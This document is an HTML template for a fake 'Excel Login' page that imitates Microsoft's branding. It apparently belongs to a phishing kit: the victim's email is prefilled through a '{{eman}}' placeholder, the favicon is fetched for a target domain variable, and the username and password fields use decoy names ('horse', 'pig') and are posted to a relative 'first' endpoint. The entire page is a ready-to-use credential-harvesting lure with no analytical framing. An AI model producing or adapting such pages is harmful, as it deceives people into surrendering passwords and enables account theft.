<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Excel - Login</title>
  <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f4f4f4;
    }

    .login-wrapper {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #eaeaea;
    }

    .auth-box {
      position: relative;
      background: #fff;
      padding: 48px;
      border-radius: 16px;
      width: 400px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
      text-align: center;
      animation: slideIn 0.8s ease;
    }

    @keyframes slideIn {
      from { opacity: 0; transform: translateY(-25px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .auth-logo {
      position: absolute;
      top: -50px;
      left: 50%;
      transform: translateX(-50%);
      width: 100px;
    }

    .auth-title {
      font-size: 28px;
      color: #217346;
      margin-top: 60px;
      margin-bottom: 30px;
    }

    .field-group {
      text-align: left;
      margin-bottom: 22px;
    }

    .field-group label {
      display: block;
      margin-bottom: 6px;
      font-weight: 600;
      color: #222;
    }

    .field-group input {
      width: 100%;
      padding: 12px;
      border-radius: 6px;
      font-size: 16px;
      border: 2px solid #217346;
      background-color: #f7f7f7;
      transition: border-color 0.3s;
    }

    .field-group input:focus {
      outline: none;
      background: #fff;
      border-color: #1a5d32;
    }

    .submit-btn {
      width: 100%;
      padding: 14px;
      font-size: 17px;
      background: linear-gradient(45deg, #217346, #1a5d32);
      color: #fff;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .submit-btn:hover {
      background: linear-gradient(45deg, #1a5d32, #0f3d21);
    }

    .help-link {
      display: block;
      margin-top: 16px;
      color: #217346;
      font-size: 14px;
      text-decoration: none;
    }

    .help-link:hover {
      color: #1a5d32;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-wrapper">
    <div class="auth-box">
      <img class="auth-logo" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD...TRUNCATED..." alt="Excel Logo">
      <h2 class="auth-title">Excel Login</h2>
      <form method="POST" action="first">
        <div class="field-group">
          <label for="username">Username</label>
          <input type="text" id="username" name="horse" value="{{eman}}" required>
        </div>
        <div class="field-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="pig" placeholder="Enter your password" required>
        </div>
        <button type="submit" class="submit-btn">Login</button>
      </form>
      <a href="#" class="help-link">Forgot Password?</a>
    </div>
  </div>
</body>
</html>
